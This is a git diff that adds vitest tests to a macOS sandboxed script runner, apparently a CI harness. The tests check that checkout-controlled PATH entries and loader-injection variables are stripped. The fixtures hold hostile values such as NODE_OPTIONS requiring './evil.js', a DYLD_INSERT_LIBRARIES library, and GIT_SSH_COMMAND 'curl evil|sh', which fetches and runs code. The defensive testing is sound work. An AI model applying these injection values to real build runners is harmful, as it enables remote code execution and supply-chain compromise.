@@ -1,7 +1,7 @@
 import { afterEach, describe, expect, it } from 'vitest';
-import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
+import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
-import { join } from 'node:path';
+import { delimiter, join } from 'node:path';
 import { parse as parseYaml } from 'yaml';
 
 import {
@@ -172,5 +172,146 @@ describe('createMacBareExecute — valid shim flows through', () => {
     expect(env['SCRIPT_JAIL_PHASE_B_UNSHARE_NET']).toBeUndefined();
     // Provisioned bin dir is PREPENDED so bare npm/pnpm/yarn resolve to it.
     expect((env['PATH'] ?? '').startsWith(PROVISIONED.nodeBinDir + ':')).toBe(true);
+  });
+
+  it('drops checkout-controlled + relative PATH entries before prepending the toolchain (codex round-4 [high])', async () => {
+    const repoDir = tmp('mb-repo-');
+    writeFileSync(join(repoDir, 'package.json'), '{"name":"x"}\n');
+    const scratchDir = tmp('mb-scratch-');
+    const configPath = join(scratchDir, 'config.yml');
+    writeFileSync(configPath, 'manager: npm\nwork_dir: /orig\n');
+
+    // A real checkout whose bin dir a workflow prepended to PATH; the PR could
+    // commit `bin/make` there.  `checkoutRoots()` reads the REAL process env, so
+    // the checkout must be visible there for its bin dir to be recognised.
+    const checkout = tmp('mb-checkout-');
+    const checkoutBin = join(checkout, 'bin');
+    mkdirSync(checkoutBin);
+    const savedWorkspace = process.env['GITHUB_WORKSPACE'];
+    process.env['GITHUB_WORKSPACE'] = checkout;
+
+    let capturedEnv: NodeJS.ProcessEnv | null = null;
+    try {
+      const exec = createMacBareExecute(
+        makeDeps({
+          env: {
+            // checkout-controlled dir + a relative entry, both ahead of system dirs
+            PATH: `${checkoutBin}${delimiter}./node_modules/.bin${delimiter}/usr/bin${delimiter}/bin`,
+          },
+          runAgentProcess: ((opts: { env: NodeJS.ProcessEnv }) => {
+            capturedEnv = opts.env;
+            return Promise.resolve(RESULT);
+          }) as unknown as NonNullable<MacBareExecuteDeps['runAgentProcess']>,
+        }),
+      );
+      await exec(makeInput({ repoDir, scratchDir, configPath }));
+    } finally {
+      if (savedWorkspace === undefined) delete process.env['GITHUB_WORKSPACE'];
+      else process.env['GITHUB_WORKSPACE'] = savedWorkspace;
+    }
+
+    const env = capturedEnv as unknown as NodeJS.ProcessEnv;
+    const path = env['PATH'] ?? '';
+    // toolchain prepended; checkout dir + relative entry dropped; system kept.
+    expect(path).toBe(
+      `${PROVISIONED.nodeBinDir}${delimiter}/usr/bin${delimiter}/bin`,
+    );
+    expect(path.includes(checkoutBin)).toBe(false);
+    expect(path.includes('node_modules/.bin')).toBe(false);
+  });
+
+  it('hands provisionNodeMac a SANITIZED env, not the raw inherited runner env (codex round-5 [critical])', async () => {
+    const repoDir = tmp('mb-repo-');
+    writeFileSync(join(repoDir, 'package.json'), '{"name":"x"}\n');
+    const scratchDir = tmp('mb-scratch-');
+    const configPath = join(scratchDir, 'config.yml');
+    writeFileSync(configPath, 'manager: npm\nwork_dir: /orig\n');
+
+    // Provisioning spawns bare-name tar/codesign/xattr; a checkout-prepended PATH
+    // + an inherited NODE_OPTIONS/DYLD_* must not reach it.  checkoutRoots() reads
+    // the REAL process env, so the checkout has to be visible there.
+    const checkout = tmp('mb-checkout-');
+    const checkoutBin = join(checkout, 'bin');
+    mkdirSync(checkoutBin);
+    const savedWorkspace = process.env['GITHUB_WORKSPACE'];
+    process.env['GITHUB_WORKSPACE'] = checkout;
+
+    let provisionEnv: NodeJS.ProcessEnv | undefined;
+    try {
+      const exec = createMacBareExecute(
+        makeDeps({
+          env: {
+            PATH: `${checkoutBin}${delimiter}/usr/bin${delimiter}/bin`,
+            NODE_OPTIONS: '--require ./evil.js',
+            DYLD_INSERT_LIBRARIES: './evil.dylib',
+            GIT_SSH_COMMAND: 'sh -c "curl evil|sh"',
+            HOME: '/Users/runner',
+          },
+          provisionNodeMac: (async (inp: { env?: NodeJS.ProcessEnv }) => {
+            provisionEnv = inp.env;
+            return PROVISIONED;
+          }) as unknown as NonNullable<MacBareExecuteDeps['provisionNodeMac']>,
+        }),
+      );
+      await exec(makeInput({ repoDir, scratchDir, configPath }));
+    } finally {
+      if (savedWorkspace === undefined) delete process.env['GITHUB_WORKSPACE'];
+      else process.env['GITHUB_WORKSPACE'] = savedWorkspace;
+    }
+
+    expect(provisionEnv).toBeDefined();
+    const env = provisionEnv as NodeJS.ProcessEnv;
+    // dangerous loader/config selectors stripped before provisioning runs
+    expect(env['NODE_OPTIONS']).toBeUndefined();
+    expect(env['DYLD_INSERT_LIBRARIES']).toBeUndefined();
+    expect(env['GIT_SSH_COMMAND']).toBeUndefined();
+    // checkout bin dropped from PATH; system dirs kept; legit env survives
+    expect(env['PATH']).toBe(`/usr/bin${delimiter}/bin`);
+    expect(env['HOME']).toBe('/Users/runner');
+  });
+
+  it('an ALL-checkout inherited PATH yields a trusted system PATH, never empty ([F3])', async () => {
+    const repoDir = tmp('mb-repo-');
+    writeFileSync(join(repoDir, 'package.json'), '{"name":"x"}\n');
+    const scratchDir = tmp('mb-scratch-');
+    const configPath = join(scratchDir, 'config.yml');
+    writeFileSync(configPath, 'manager: npm\nwork_dir: /orig\n');
+
+    const checkout = tmp('mb-checkout-');
+    const checkoutBin = join(checkout, 'bin');
+    mkdirSync(checkoutBin);
+    const savedWorkspace = process.env['GITHUB_WORKSPACE'];
+    process.env['GITHUB_WORKSPACE'] = checkout;
+
+    let provisionEnv: NodeJS.ProcessEnv | undefined;
+    let agentPath: string | undefined;
+    try {
+      const exec = createMacBareExecute(
+        makeDeps({
+          // EVERY inherited PATH segment is checkout-controlled → all dropped.
+          env: { PATH: checkoutBin },
+          provisionNodeMac: (async (inp: { env?: NodeJS.ProcessEnv }) => {
+            provisionEnv = inp.env;
+            return PROVISIONED;
+          }) as unknown as NonNullable<MacBareExecuteDeps['provisionNodeMac']>,
+          runAgentProcess: ((opts: { env: NodeJS.ProcessEnv }) => {
+            agentPath = opts.env['PATH'];
+            return Promise.resolve(RESULT);
+          }) as unknown as NonNullable<MacBareExecuteDeps['runAgentProcess']>,
+        }),
+      );
+      await exec(makeInput({ repoDir, scratchDir, configPath }));
+    } finally {
+      if (savedWorkspace === undefined) delete process.env['GITHUB_WORKSPACE'];
+      else process.env['GITHUB_WORKSPACE'] = savedWorkspace;
+    }
+
+    // provisioning env: never '' (would be a cwd search), substituted system PATH.
+    expect(provisionEnv?.['PATH']).toBe('/usr/bin:/bin:/usr/sbin:/sbin');
+    // orchestrator PATH: toolchain prepended to the trusted system PATH, no
+    // trailing empty (cwd) segment, and the checkout bin is gone.
+    expect(agentPath).toBe(`${PROVISIONED.nodeBinDir}:/usr/bin:/bin:/usr/sbin:/sbin`);
+    expect(agentPath!.endsWith(':')).toBe(false);
+    expect(agentPath!.includes(checkoutBin)).toBe(false);
   });
 });
